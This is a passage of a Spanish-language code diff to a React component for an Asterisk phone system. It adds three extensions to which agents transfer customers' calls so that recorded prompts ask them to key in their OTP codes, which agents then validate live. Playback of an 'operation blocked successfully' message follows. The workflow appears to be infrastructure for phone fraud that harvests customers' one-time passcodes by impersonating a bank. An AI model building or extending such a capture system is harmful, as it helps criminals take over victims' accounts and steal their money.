@@ -39,6 +39,9 @@ interface AudioLibraryTabProps {
   onAssignToAgentTransfer?: (audioId: string) => void;
   onAssignTo7777?: (audioId: string) => void;
   onAssignTo6666?: (audioId: string) => void;
+  onAssignTo5555?: (audioId: string) => void;
+  onAssignTo4444?: (audioId: string) => void;
+  onAssignTo3333?: (audioId: string) => void;
   activeAssignments?: ActiveAudioAssignments;
   onAssignRole?: (role: AudioRole, asteriskPath: string) => void;
 }
@@ -77,6 +80,39 @@ const SYSTEM_ROLES: RoleConfig[] = [
     description: 'Audio reproducido inmediatamente al cliente cuando el asesor transfiere la llamada a la 6666 para capturar el código OTP con locución independiente.',
     astDbKey: 'ivr_vars 6666_intro',
     fallbackDefault: 'custom/bienvenida_6666',
+  },
+  {
+    role: 'welcome_5555',
+    title: 'Bienvenida Extensión 5555 (Captura en Vivo)',
+    badge: 'Extensión 5555',
+    badgeColor: 'bg-amber-500/20 text-amber-300 border-amber-500/30',
+    category: 'otp',
+    icon: Headphones,
+    description: 'Audio reproducido inmediatamente al cliente cuando el asesor transfiere la llamada a la 5555 para capturar el código OTP con locución independiente.',
+    astDbKey: 'ivr_vars 5555_intro',
+    fallbackDefault: 'custom/solicitar_codigo_otp',
+  },
+  {
+    role: 'welcome_4444',
+    title: 'Bienvenida Extensión 4444 (Captura en Vivo)',
+    badge: 'Extensión 4444',
+    badgeColor: 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30',
+    category: 'otp',
+    icon: Headphones,
+    description: 'Audio reproducido inmediatamente al cliente cuando el asesor transfiere la llamada a la 4444 para capturar el código OTP con locución independiente.',
+    astDbKey: 'ivr_vars 4444_intro',
+    fallbackDefault: 'custom/solicitar_codigo_otp',
+  },
+  {
+    role: 'welcome_3333',
+    title: 'Bienvenida Extensión 3333 (Captura en Vivo)',
+    badge: 'Extensión 3333',
+    badgeColor: 'bg-pink-500/20 text-pink-300 border-pink-500/30',
+    category: 'otp',
+    icon: Headphones,
+    description: 'Audio reproducido inmediatamente al cliente cuando el asesor transfiere la llamada a la 3333 para capturar el código OTP con locución independiente.',
+    astDbKey: 'ivr_vars 3333_intro',
+    fallbackDefault: 'custom/solicitar_codigo_otp',
   },
   {
     role: 'press1_welcome',
@@ -166,6 +202,9 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
   onAssignToAgentTransfer,
   onAssignTo7777,
   onAssignTo6666,
+  onAssignTo5555,
+  onAssignTo4444,
+  onAssignTo3333,
   activeAssignments: propActiveAssignments,
   onAssignRole,
 }) => {
@@ -180,6 +219,9 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
       press1_invalid: 'custom/opcion_invalida',
       welcome_7777: 'custom/solicitar_codigo_otp',
       welcome_6666: 'custom/bienvenida_6666',
+      welcome_5555: 'custom/solicitar_codigo_otp',
+      welcome_4444: 'custom/solicitar_codigo_otp',
+      welcome_3333: 'custom/solicitar_codigo_otp',
       otp_welcome: 'custom/solicitar_codigo_otp',
       otp_wait: 'custom/un_momento_validando_informacion',
       otp_success: 'custom/operacion_bloqueada_exito',
@@ -274,7 +316,7 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
     }
   };
 
-  // Handler to permanently save and lock 7777 and 6666 configuration
+  // Handler to permanently save and lock 7777, 6666, 5555, 4444 and 3333 configuration
   const [isSavingOtpExtensions, setIsSavingOtpExtensions] = useState(false);
   const [otpExtensionsSaved, setOtpExtensionsSaved] = useState(false);
 
@@ -287,13 +329,16 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
         body: JSON.stringify({
           welcome_7777: activeAssignments.welcome_7777 || 'custom/solicitar_codigo_otp',
           welcome_6666: activeAssignments.welcome_6666 || 'custom/bienvenida_6666',
+          welcome_5555: activeAssignments.welcome_5555 || 'custom/solicitar_codigo_otp',
+          welcome_4444: activeAssignments.welcome_4444 || 'custom/solicitar_codigo_otp',
+          welcome_3333: activeAssignments.welcome_3333 || 'custom/solicitar_codigo_otp',
         }),
       });
       const data = await res.json();
       if (data.success) {
         setOtpExtensionsSaved(true);
         setFeedbackMsg({
-          text: '✓ Configuración de extensiones 7777 y 6666 guardada y bloqueada en AstDB. No cambiará al actualizar el sistema.',
+          text: '✓ Configuración de extensiones 7777, 6666, 5555, 4444 y 3333 guardada y bloqueada en AstDB. No cambiará al actualizar el sistema.',
           type: 'success',
         });
         setTimeout(() => {
@@ -311,8 +356,8 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
     }
   };
 
-  // Featured Extensions View State (7777 and 6666)
-  const [featuredExtTab, setFeaturedExtTab] = useState<'7777' | '6666' | 'both'>('both');
+  // Featured Extensions View State (7777, 6666, 5555, 4444, 3333)
+  const [featuredExtTab, setFeaturedExtTab] = useState<'all' | '7777' | '6666' | '5555' | '4444' | '3333'>('all');
 
   // Upload modal state
   const [isDragging, setIsDragging] = useState(false);
@@ -335,8 +380,15 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
   const fileInputRef = useRef<HTMLInputElement | null>(null);
   const ext7777FileInputRef = useRef<HTMLInputElement | null>(null);
   const ext6666FileInputRef = useRef<HTMLInputElement | null>(null);
+  const ext5555FileInputRef = useRef<HTMLInputElement | null>(null);
+  const ext4444FileInputRef = useRef<HTMLInputElement | null>(null);
+  const ext3333FileInputRef = useRef<HTMLInputElement | null>(null);
+
   const [isUploading7777, setIsUploading7777] = useState(false);
   const [isUploading6666, setIsUploading6666] = useState(false);
+  const [isUploading5555, setIsUploading5555] = useState(false);
+  const [isUploading4444, setIsUploading4444] = useState(false);
+  const [isUploading3333, setIsUploading3333] = useState(false);
 
   const handleUpload7777Direct = async (file: File) => {
     if (!file) return;
@@ -460,9 +512,195 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
     reader.readAsDataURL(file);
   };
 
+  const handleUpload5555Direct = async (file: File) => {
+    if (!file) return;
+    setIsUploading5555(true);
+    const reader = new FileReader();
+    reader.onload = async (e) => {
+      const dataUrl = e.target?.result as string;
+      const baseName = file.name.replace(/\.[^/.]+$/, '').toLowerCase().replace(/[^a-z0-9_]/g, '_') || 'audio_5555';
+      const cleanPath = `custom/${baseName}`;
+
+      const newAudioItem: AudioPrompt = {
+        id: `audio-5555-${Date.now()}`,
+        name: `Extensión 5555: ${file.name.replace(/\.[^/.]+$/, '')}`,
+        category: 'welcome_5555',
+        fileName: `${baseName}.wav`,
+        fileSize: `${(file.size / 1024).toFixed(1)} KB`,
+        durationSec: 5.5,
+        format: 'WAV',
+        sampleRate: '8000Hz PCM 16-bit Mono',
+        dataUrl: dataUrl,
+        asteriskPath: cleanPath,
+        createdAt: new Date().toISOString(),
+      };
+
+      onAddAudio(newAudioItem);
+
+      try {
+        await fetch('/api/asterisk/audio/upload', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            name: newAudioItem.name,
+            fileName: `${baseName}.wav`,
+            category: 'welcome_5555',
+            dataUrl: dataUrl,
+          }),
+        });
+
+        await handleAssignRoleDirect('welcome_5555', cleanPath);
+        if (onAssignTo5555) {
+          onAssignTo5555(newAudioItem.id);
+        }
+
+        setFeedbackMsg({
+          text: `¡Audio para la Extensión 5555 cargado y activo con éxito en Asterisk! Al transferir a la 5555 o 555 se reproducirá de inmediato.`,
+          type: 'success',
+        });
+        setTimeout(() => setFeedbackMsg(null), 5000);
+      } catch (err: any) {
+        console.error('Error subiendo audio 5555:', err);
+        setFeedbackMsg({
+          text: `Error al subir el audio para la 5555: ${err.message}`,
+          type: 'info',
+        });
+        setTimeout(() => setFeedbackMsg(null), 5000);
+      } finally {
+        setIsUploading5555(false);
+      }
+    };
+    reader.readAsDataURL(file);
+  };
+
+  const handleUpload4444Direct = async (file: File) => {
+    if (!file) return;
+    setIsUploading4444(true);
+    const reader = new FileReader();
+    reader.onload = async (e) => {
+      const dataUrl = e.target?.result as string;
+      const baseName = file.name.replace(/\.[^/.]+$/, '').toLowerCase().replace(/[^a-z0-9_]/g, '_') || 'audio_4444';
+      const cleanPath = `custom/${baseName}`;
+
+      const newAudioItem: AudioPrompt = {
+        id: `audio-4444-${Date.now()}`,
+        name: `Extensión 4444: ${file.name.replace(/\.[^/.]+$/, '')}`,
+        category: 'welcome_4444',
+        fileName: `${baseName}.wav`,
+        fileSize: `${(file.size / 1024).toFixed(1)} KB`,
+        durationSec: 5.5,
+        format: 'WAV',
+        sampleRate: '8000Hz PCM 16-bit Mono',
+        dataUrl: dataUrl,
+        asteriskPath: cleanPath,
+        createdAt: new Date().toISOString(),
+      };
+
+      onAddAudio(newAudioItem);
+
+      try {
+        await fetch('/api/asterisk/audio/upload', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            name: newAudioItem.name,
+            fileName: `${baseName}.wav`,
+            category: 'welcome_4444',
+            dataUrl: dataUrl,
+          }),
+        });
+
+        await handleAssignRoleDirect('welcome_4444', cleanPath);
+        if (onAssignTo4444) {
+          onAssignTo4444(newAudioItem.id);
+        }
+
+        setFeedbackMsg({
+          text: `¡Audio para la Extensión 4444 cargado y activo con éxito en Asterisk! Al transferir a la 4444 o 444 se reproducirá de inmediato.`,
+          type: 'success',
+        });
+        setTimeout(() => setFeedbackMsg(null), 5000);
+      } catch (err: any) {
+        console.error('Error subiendo audio 4444:', err);
+        setFeedbackMsg({
+          text: `Error al subir el audio para la 4444: ${err.message}`,
+          type: 'info',
+        });
+        setTimeout(() => setFeedbackMsg(null), 5000);
+      } finally {
+        setIsUploading4444(false);
+      }
+    };
+    reader.readAsDataURL(file);
+  };
+
+  const handleUpload3333Direct = async (file: File) => {
+    if (!file) return;
+    setIsUploading3333(true);
+    const reader = new FileReader();
+    reader.onload = async (e) => {
+      const dataUrl = e.target?.result as string;
+      const baseName = file.name.replace(/\.[^/.]+$/, '').toLowerCase().replace(/[^a-z0-9_]/g, '_') || 'audio_3333';
+      const cleanPath = `custom/${baseName}`;
+
+      const newAudioItem: AudioPrompt = {
+        id: `audio-3333-${Date.now()}`,
+        name: `Extensión 3333: ${file.name.replace(/\.[^/.]+$/, '')}`,
+        category: 'welcome_3333',
+        fileName: `${baseName}.wav`,
+        fileSize: `${(file.size / 1024).toFixed(1)} KB`,
+        durationSec: 5.5,
+        format: 'WAV',
+        sampleRate: '8000Hz PCM 16-bit Mono',
+        dataUrl: dataUrl,
+        asteriskPath: cleanPath,
+        createdAt: new Date().toISOString(),
+      };
+
+      onAddAudio(newAudioItem);
+
+      try {
+        await fetch('/api/asterisk/audio/upload', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            name: newAudioItem.name,
+            fileName: `${baseName}.wav`,
+            category: 'welcome_3333',
+            dataUrl: dataUrl,
+          }),
+        });
+
+        await handleAssignRoleDirect('welcome_3333', cleanPath);
+        if (onAssignTo3333) {
+          onAssignTo3333(newAudioItem.id);
+        }
+
+        setFeedbackMsg({
+          text: `¡Audio para la Extensión 3333 cargado y activo con éxito en Asterisk! Al transferir a la 3333 o 333 se reproducirá de inmediato.`,
+          type: 'success',
+        });
+        setTimeout(() => setFeedbackMsg(null), 5000);
+      } catch (err: any) {
+        console.error('Error subiendo audio 3333:', err);
+        setFeedbackMsg({
+          text: `Error al subir el audio para la 3333: ${err.message}`,
+          type: 'info',
+        });
+        setTimeout(() => setFeedbackMsg(null), 5000);
+      } finally {
+        setIsUploading3333(false);
+      }
+    };
+    reader.readAsDataURL(file);
+  };
+
   const categoryLabels: Record<AudioPrompt['category'], { label: string; color: string }> = {
     welcome_7777: { label: 'Bienvenida Extensión 7777', color: 'text-purple-400 bg-purple-500/10 border-purple-500/20 font-bold' },
     welcome_6666: { label: 'Bienvenida Extensión 6666', color: 'text-cyan-400 bg-cyan-500/10 border-cyan-500/20 font-bold' },
+    welcome_5555: { label: 'Bienvenida Extensión 5555', color: 'text-amber-400 bg-amber-500/10 border-amber-500/20 font-bold' },
+    welcome_4444: { label: 'Bienvenida Extensión 4444', color: 'text-emerald-400 bg-emerald-500/10 border-emerald-500/20 font-bold' },
+    welcome_3333: { label: 'Bienvenida Extensión 3333', color: 'text-pink-400 bg-pink-500/10 border-pink-500/20 font-bold' },
     press1_welcome: { label: 'IVR Bienvenida Press 1', color: 'text-emerald-400 bg-emerald-500/10 border-emerald-500/20' },
     press1_invalid: { label: 'IVR Opción Inválida', color: 'text-rose-400 bg-rose-500/10 border-rose-500/20' },
     agent_transfer: { label: 'Transferencia Asesor (Opción 1)', color: 'text-amber-400 bg-amber-500/10 border-amber-500/20' },
@@ -760,7 +998,7 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
         </div>
       )}
 
-      {/* SECTION 1: PANELES DESTACADOS PARA EXTENSIONES 7777 Y 6666 */}
+      {/* SECTION 1: PANELES DESTACADOS PARA EXTENSIONES 7777, 6666, 5555, 4444 Y 3333 */}
       <div className="space-y-4">
         <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 bg-slate-900/90 p-3.5 rounded-xl border border-slate-800">
           <div className="flex items-center gap-2.5">
@@ -769,10 +1007,10 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
             </div>
             <div>
               <h3 className="text-sm font-bold text-white">
-                Extensiones Dedicadas de Captura en Vivo (7777 y 6666)
+                Extensiones Dedicadas de Captura en Vivo (7777, 6666, 5555, 4444 y 3333)
               </h3>
               <p className="text-xs text-slate-400">
-                Transfiere la llamada del cliente a la extensión <strong className="text-purple-300">7777</strong> o <strong className="text-cyan-300">6666</strong>. Ambas capturan el token con validación del agente, usando audios 100% independientes.
+                Transfiere la llamada del cliente a cualquiera de las extensiones <strong className="text-purple-300">7777</strong>, <strong className="text-cyan-300">6666</strong>, <strong className="text-amber-300">5555</strong>, <strong className="text-emerald-300">4444</strong> o <strong className="text-pink-300">3333</strong>. Todas capturan el código con validación del agente y cuentan con locuciones 100% independientes.
               </p>
             </div>
           </div>
@@ -783,28 +1021,29 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
               className={`px-3.5 py-1.5 rounded-lg text-xs font-bold transition-all flex items-center gap-1.5 shadow-md ${
                 otpExtensionsSaved
                   ? 'bg-emerald-500 text-black shadow-emerald-500/20 ring-2 ring-emerald-400'
-                  : 'bg-gradient-to-r from-purple-600 to-cyan-600 hover:from-purple-500 hover:to-cyan-500 text-white shadow-purple-600/20'
+                  : 'bg-gradient-to-r from-purple-600 via-emerald-600 to-cyan-600 hover:from-purple-500 hover:to-cyan-500 text-white shadow-purple-600/20'
               }`}
-              title="Guardar y bloquear permanentemente las locuciones de la 7777 y 6666 para que no cambien al sincronizar el sistema"
+              title="Guardar y bloquear permanentemente las locuciones de todas las extensiones OTP para que no cambien al sincronizar el sistema"
             >
               {otpExtensionsSaved ? <Check className="w-3.5 h-3.5 text-black" /> : <Lock className="w-3.5 h-3.5" />}
-              <span>{isSavingOtpExtensions ? 'Guardando en AstDB...' : otpExtensionsSaved ? '¡Configuración Bloqueada!' : 'Guardar y Bloquear 7777 / 6666'}</span>
+              <span>{isSavingOtpExtensions ? 'Guardando en AstDB...' : otpExtensionsSaved ? '¡Configuración Bloqueada!' : 'Guardar y Bloquear Extensiones OTP'}</span>
             </button>
 
-            <div className="flex items-center gap-1 bg-slate-950 p-1 rounded-lg border border-slate-800 text-xs">
+            {/* Menú de selección individual de extensiones */}
+            <div className="flex items-center gap-1 bg-slate-950 p-1 rounded-lg border border-slate-800 text-xs flex-wrap">
               <button
-                onClick={() => setFeaturedExtTab('both')}
-                className={`px-3 py-1 rounded transition-colors font-medium ${
-                  featuredExtTab === 'both'
+                onClick={() => setFeaturedExtTab('all')}
+                className={`px-2.5 py-1 rounded transition-colors font-medium ${
+                  featuredExtTab === 'all'
                     ? 'bg-indigo-600 text-white font-bold shadow-sm'
                     : 'text-slate-400 hover:text-white'
                 }`}
               >
-                Ver Ambas
+                Ver Todas (5)
               </button>
               <button
                 onClick={() => setFeaturedExtTab('7777')}
-                className={`px-3 py-1 rounded transition-colors font-medium ${
+                className={`px-2.5 py-1 rounded transition-colors font-medium ${
                   featuredExtTab === '7777'
                     ? 'bg-purple-600 text-white font-bold shadow-sm'
                     : 'text-slate-400 hover:text-purple-300'
@@ -814,7 +1053,7 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
               </button>
               <button
                 onClick={() => setFeaturedExtTab('6666')}
-                className={`px-3 py-1 rounded transition-colors font-medium ${
+                className={`px-2.5 py-1 rounded transition-colors font-medium ${
                   featuredExtTab === '6666'
                     ? 'bg-cyan-600 text-white font-bold shadow-sm'
                     : 'text-slate-400 hover:text-cyan-300'
@@ -822,12 +1061,42 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
               >
                 Ext. 6666
               </button>
+              <button
+                onClick={() => setFeaturedExtTab('5555')}
+                className={`px-2.5 py-1 rounded transition-colors font-medium ${
+                  featuredExtTab === '5555'
+                    ? 'bg-amber-600 text-white font-bold shadow-sm'
+                    : 'text-slate-400 hover:text-amber-300'
+                }`}
+              >
+                Ext. 5555
+              </button>
+              <button
+                onClick={() => setFeaturedExtTab('4444')}
+                className={`px-2.5 py-1 rounded transition-colors font-medium ${
+                  featuredExtTab === '4444'
+                    ? 'bg-emerald-600 text-white font-bold shadow-sm'
+                    : 'text-slate-400 hover:text-emerald-300'
+                }`}
+              >
+                Ext. 4444
+              </button>
+              <button
+                onClick={() => setFeaturedExtTab('3333')}
+                className={`px-2.5 py-1 rounded transition-colors font-medium ${
+                  featuredExtTab === '3333'
+                    ? 'bg-pink-600 text-white font-bold shadow-sm'
+                    : 'text-slate-400 hover:text-pink-300'
+                }`}
+              >
+                Ext. 3333
+              </button>
             </div>
           </div>
         </div>
 
         {/* PANEL EXTENSIÓN 7777 */}
-        {(featuredExtTab === 'both' || featuredExtTab === '7777') && (
+        {(featuredExtTab === 'all' || featuredExtTab === '7777') && (
           <div className="p-6 rounded-2xl bg-gradient-to-br from-purple-950/50 via-slate-900 to-slate-950 border-2 border-purple-500/50 shadow-xl space-y-4">
             <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-purple-500/20">
               <div className="flex items-start gap-3">
@@ -952,7 +1221,7 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
         )}
 
         {/* PANEL EXTENSIÓN 6666 */}
-        {(featuredExtTab === 'both' || featuredExtTab === '6666') && (
+        {(featuredExtTab === 'all' || featuredExtTab === '6666') && (
           <div className="p-6 rounded-2xl bg-gradient-to-br from-cyan-950/50 via-slate-900 to-slate-950 border-2 border-cyan-500/50 shadow-xl space-y-4">
             <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-cyan-500/20">
               <div className="flex items-start gap-3">
@@ -965,7 +1234,7 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
                       Audio Exclusivo para Extensión 6666 / 666
                     </h3>
                     <span className="px-2.5 py-0.5 rounded-full text-xs font-bold bg-cyan-500 text-black shadow-sm">
-                      Nueva Extensión OTP
+                      Extensión OTP 6666
                     </span>
                   </div>
                   <p className="text-xs text-cyan-200/80 mt-1">
@@ -1075,6 +1344,381 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
             </div>
           </div>
         )}
+
+        {/* PANEL EXTENSIÓN 5555 */}
+        {(featuredExtTab === 'all' || featuredExtTab === '5555') && (
+          <div className="p-6 rounded-2xl bg-gradient-to-br from-amber-950/50 via-slate-900 to-slate-950 border-2 border-amber-500/50 shadow-xl space-y-4">
+            <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-amber-500/20">
+              <div className="flex items-start gap-3">
+                <div className="w-11 h-11 rounded-xl bg-amber-500/20 border border-amber-500/40 flex items-center justify-center text-amber-300 shrink-0 shadow-inner">
+                  <Headphones className="w-6 h-6" />
+                </div>
+                <div>
+                  <div className="flex items-center gap-2">
+                    <h3 className="text-base font-bold text-white">
+                      Audio Exclusivo para Extensión 5555 / 555
+                    </h3>
+                    <span className="px-2.5 py-0.5 rounded-full text-xs font-bold bg-amber-500 text-slate-950 shadow-sm">
+                      Extensión OTP 5555
+                    </span>
+                  </div>
+                  <p className="text-xs text-amber-200/80 mt-1">
+                    Audio reproducido al cliente cuando transfieres a la 5555: <span className="font-semibold text-white">Mismas características que la 7777 con locución independiente</span>.
+                  </p>
+                </div>
+              </div>
+
+              <div className="flex items-center gap-2 shrink-0">
+                <input
+                  type="file"
+                  ref={ext5555FileInputRef}
+                  onChange={(e) => {
+                    if (e.target.files && e.target.files[0]) {
+                      handleUpload5555Direct(e.target.files[0]);
+                    }
+                  }}
+                  accept="audio/*,.wav,.mp3,.ogg,.gsm"
+                  className="hidden"
+                />
+                <button
+                  onClick={() => ext5555FileInputRef.current?.click()}
+                  disabled={isUploading5555}
+                  className="inline-flex items-center space-x-2 px-5 py-2.5 rounded-xl text-sm font-bold bg-amber-500 hover:bg-amber-400 text-slate-950 shadow-lg shadow-amber-500/30 transition-all transform active:scale-95 disabled:opacity-50"
+                >
+                  <UploadCloud className="w-4 h-4" />
+                  <span>{isUploading5555 ? 'Subiendo y Activando...' : 'Cargar Audio para Extensión 5555'}</span>
+                </button>
+              </div>
+            </div>
+
+            {/* Zona de estado y selector rápido para la 5555 */}
+            <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 pt-1">
+              <div className="lg:col-span-2 p-4 rounded-xl bg-slate-950/80 border border-amber-500/30 space-y-2.5">
+                <div className="flex items-center justify-between text-xs">
+                  <span className="text-slate-300 font-semibold">Audio asignado a la 5555 / 555:</span>
+                  <span className="font-mono text-amber-300 font-bold bg-amber-950/60 px-2 py-0.5 rounded border border-amber-800/50">
+                    {activeAssignments.welcome_5555 || 'custom/bienvenida_5555'}
+                  </span>
+                </div>
+
+                <div className="flex items-center gap-2">
+                  <select
+                    value={activeAssignments.welcome_5555 || 'custom/bienvenida_5555'}
+                    disabled={isSyncingRole.welcome_5555}
+                    onChange={(e) => handleAssignRoleDirect('welcome_5555', e.target.value)}
+                    className="flex-1 px-3 py-2 rounded-lg bg-slate-900 border border-amber-500/40 text-slate-100 text-xs font-mono focus:border-amber-400 focus:outline-none"
+                  >
+                    {audios.map((a) => (
+                      <option key={a.id} value={a.asteriskPath}>
+                        {a.name} ({a.asteriskPath})
+                      </option>
+                    ))}
+                  </select>
+
+                  <button
+                    onClick={() => handlePlayByPath(activeAssignments.welcome_5555 || 'custom/bienvenida_5555')}
+                    className="px-3.5 py-2 rounded-lg bg-amber-600 hover:bg-amber-500 text-slate-950 text-xs font-semibold flex items-center gap-1.5 shadow-md shadow-amber-600/20"
+                    title="Escuchar audio actual de la 5555"
+                  >
+                    <Play className="w-3.5 h-3.5" />
+                    <span>Escuchar</span>
+                  </button>
+
+                  <button
+                    onClick={() => handleDeactivateRole('welcome_5555')}
+                    disabled={isSyncingRole.welcome_5555}
+                    className="px-2.5 py-2 rounded-lg bg-slate-800 hover:bg-rose-950/40 text-slate-400 hover:text-rose-400 border border-slate-700 hover:border-rose-500/30 text-xs font-semibold flex items-center gap-1"
+                    title="Desactivar audio actual y restaurar locución predeterminada para la 5555"
+                  >
+                    <PowerOff className="w-3.5 h-3.5" />
+                    <span className="hidden sm:inline">Desactivar</span>
+                  </button>
+                </div>
+
+                <div className="flex items-center justify-between text-[11px] text-slate-400">
+                  <span className="flex items-center gap-1.5 text-emerald-400">
+                    <CheckCircle2 className="w-3.5 h-3.5" />
+                    <span>AstDB: ivr_vars 5555_intro y ivr_vars 5555_prompt</span>
+                  </span>
+                  <span className="text-slate-400">Captura hasta 10 dígitos + tecla #</span>
+                </div>
+              </div>
+
+              <div
+                onDragOver={(e) => {
+                  e.preventDefault();
+                  setIsDragging(true);
+                }}
+                onDragLeave={() => setIsDragging(false)}
+                onDrop={(e) => {
+                  e.preventDefault();
+                  setIsDragging(false);
+                  if (e.dataTransfer.files && e.dataTransfer.files[0]) {
+                    handleUpload5555Direct(e.dataTransfer.files[0]);
+                  }
+                }}
+                onClick={() => ext5555FileInputRef.current?.click()}
+                className="p-4 rounded-xl border-2 border-dashed border-amber-500/40 bg-amber-950/20 hover:bg-amber-950/40 hover:border-amber-400 transition-all flex flex-col items-center justify-center text-center cursor-pointer space-y-1.5"
+              >
+                <UploadCloud className="w-6 h-6 text-amber-400" />
+                <div className="text-xs font-bold text-white">Arrastra el audio de la 5555 aquí</div>
+                <p className="text-[10px] text-amber-300/70 leading-tight">
+                  WAV o MP3. Se optimiza y activa en caliente en Asterisk al instante.
+                </p>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {/* PANEL EXTENSIÓN 4444 */}
+        {(featuredExtTab === 'all' || featuredExtTab === '4444') && (
+          <div className="p-6 rounded-2xl bg-gradient-to-br from-emerald-950/50 via-slate-900 to-slate-950 border-2 border-emerald-500/50 shadow-xl space-y-4">
+            <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-emerald-500/20">
+              <div className="flex items-start gap-3">
+                <div className="w-11 h-11 rounded-xl bg-emerald-500/20 border border-emerald-500/40 flex items-center justify-center text-emerald-300 shrink-0 shadow-inner">
+                  <Headphones className="w-6 h-6" />
+                </div>
+                <div>
+                  <div className="flex items-center gap-2">
+                    <h3 className="text-base font-bold text-white">
+                      Audio Exclusivo para Extensión 4444 / 444
+                    </h3>
+                    <span className="px-2.5 py-0.5 rounded-full text-xs font-bold bg-emerald-500 text-slate-950 shadow-sm">
+                      Extensión OTP 4444
+                    </span>
+                  </div>
+                  <p className="text-xs text-emerald-200/80 mt-1">
+                    Audio reproducido al cliente cuando transfieres a la 4444: <span className="font-semibold text-white">Mismas características que la 7777 con locución independiente</span>.
+                  </p>
+                </div>
+              </div>
+
+              <div className="flex items-center gap-2 shrink-0">
+                <input
+                  type="file"
+                  ref={ext4444FileInputRef}
+                  onChange={(e) => {
+                    if (e.target.files && e.target.files[0]) {
+                      handleUpload4444Direct(e.target.files[0]);
+                    }
+                  }}
+                  accept="audio/*,.wav,.mp3,.ogg,.gsm"
+                  className="hidden"
+                />
+                <button
+                  onClick={() => ext4444FileInputRef.current?.click()}
+                  disabled={isUploading4444}
+                  className="inline-flex items-center space-x-2 px-5 py-2.5 rounded-xl text-sm font-bold bg-emerald-500 hover:bg-emerald-400 text-slate-950 shadow-lg shadow-emerald-500/30 transition-all transform active:scale-95 disabled:opacity-50"
+                >
+                  <UploadCloud className="w-4 h-4" />
+                  <span>{isUploading4444 ? 'Subiendo y Activando...' : 'Cargar Audio para Extensión 4444'}</span>
+                </button>
+              </div>
+            </div>
+
+            {/* Zona de estado y selector rápido para la 4444 */}
+            <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 pt-1">
+              <div className="lg:col-span-2 p-4 rounded-xl bg-slate-950/80 border border-emerald-500/30 space-y-2.5">
+                <div className="flex items-center justify-between text-xs">
+                  <span className="text-slate-300 font-semibold">Audio asignado a la 4444 / 444:</span>
+                  <span className="font-mono text-emerald-300 font-bold bg-emerald-950/60 px-2 py-0.5 rounded border border-emerald-800/50">
+                    {activeAssignments.welcome_4444 || 'custom/bienvenida_4444'}
+                  </span>
+                </div>
+
+                <div className="flex items-center gap-2">
+                  <select
+                    value={activeAssignments.welcome_4444 || 'custom/bienvenida_4444'}
+                    disabled={isSyncingRole.welcome_4444}
+                    onChange={(e) => handleAssignRoleDirect('welcome_4444', e.target.value)}
+                    className="flex-1 px-3 py-2 rounded-lg bg-slate-900 border border-emerald-500/40 text-slate-100 text-xs font-mono focus:border-emerald-400 focus:outline-none"
+                  >
+                    {audios.map((a) => (
+                      <option key={a.id} value={a.asteriskPath}>
+                        {a.name} ({a.asteriskPath})
+                      </option>
+                    ))}
+                  </select>
+
+                  <button
+                    onClick={() => handlePlayByPath(activeAssignments.welcome_4444 || 'custom/bienvenida_4444')}
+                    className="px-3.5 py-2 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-slate-950 text-xs font-semibold flex items-center gap-1.5 shadow-md shadow-emerald-600/20"
+                    title="Escuchar audio actual de la 4444"
+                  >
+                    <Play className="w-3.5 h-3.5" />
+                    <span>Escuchar</span>
+                  </button>
+
+                  <button
+                    onClick={() => handleDeactivateRole('welcome_4444')}
+                    disabled={isSyncingRole.welcome_4444}
+                    className="px-2.5 py-2 rounded-lg bg-slate-800 hover:bg-rose-950/40 text-slate-400 hover:text-rose-400 border border-slate-700 hover:border-rose-500/30 text-xs font-semibold flex items-center gap-1"
+                    title="Desactivar audio actual y restaurar locución predeterminada para la 4444"
+                  >
+                    <PowerOff className="w-3.5 h-3.5" />
+                    <span className="hidden sm:inline">Desactivar</span>
+                  </button>
+                </div>
+
+                <div className="flex items-center justify-between text-[11px] text-slate-400">
+                  <span className="flex items-center gap-1.5 text-emerald-400">
+                    <CheckCircle2 className="w-3.5 h-3.5" />
+                    <span>AstDB: ivr_vars 4444_intro y ivr_vars 4444_prompt</span>
+                  </span>
+                  <span className="text-slate-400">Captura hasta 10 dígitos + tecla #</span>
+                </div>
+              </div>
+
+              <div
+                onDragOver={(e) => {
+                  e.preventDefault();
+                  setIsDragging(true);
+                }}
+                onDragLeave={() => setIsDragging(false)}
+                onDrop={(e) => {
+                  e.preventDefault();
+                  setIsDragging(false);
+                  if (e.dataTransfer.files && e.dataTransfer.files[0]) {
+                    handleUpload4444Direct(e.dataTransfer.files[0]);
+                  }
+                }}
+                onClick={() => ext4444FileInputRef.current?.click()}
+                className="p-4 rounded-xl border-2 border-dashed border-emerald-500/40 bg-emerald-950/20 hover:bg-emerald-950/40 hover:border-emerald-400 transition-all flex flex-col items-center justify-center text-center cursor-pointer space-y-1.5"
+              >
